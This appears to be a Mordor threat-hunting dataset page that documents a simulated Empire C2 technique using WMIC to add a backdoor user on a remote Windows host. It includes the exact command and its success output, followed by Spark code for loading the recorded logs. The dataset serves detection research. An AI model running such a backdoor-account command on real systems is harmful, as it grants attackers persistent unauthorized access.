# WMIC Add User Backdoor

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190518231333 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | None |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz |
| References        | None |

## Dataset Description
This dataset represents adversaries using WMI to add a backdoor user on endpoints remotely

## Adversary View
```
(Empire: V6W3TH8Y) > shell wmic /node:IT001 process call create "net user /add backdoor pa$$w0rd1"
[*] Tasked V6W3TH8Y to run TASK_SHELL
[*] Agent V6W3TH8Y tasked with task ID 12
(Empire: V6W3TH8Y) > Executing (Win32_Process)->Create()

Method execution successful.

Out Parameters:
instance of __PARAMETERS
{
  ProcessId = 6580;
  ReturnValue = 0;
};

..Command execution completed.

(Empire: V6W3TH8Y) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        